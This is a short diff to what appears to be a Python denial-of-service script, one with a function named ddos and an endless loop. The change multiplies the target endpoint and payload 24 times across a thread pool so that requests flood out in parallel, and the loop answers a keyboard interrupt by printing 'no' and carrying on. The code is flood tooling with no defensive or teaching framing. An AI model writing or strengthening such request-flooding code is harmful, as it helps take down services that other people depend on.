@@ -17,7 +17,10 @@ def ddos(one, two):
 while 1:
     try:
         with ThreadPoolExecutor(max_workers=24) as executor:
-            executor.map(ddos, [endpoint], [data])
+            urls = [endpoint] * 24
+            payloads = [data] * 24
+
+            executor.map(worker, urls, payloads)
         exceptions = 0
     except KeyboardInterrupt:
         print("no")
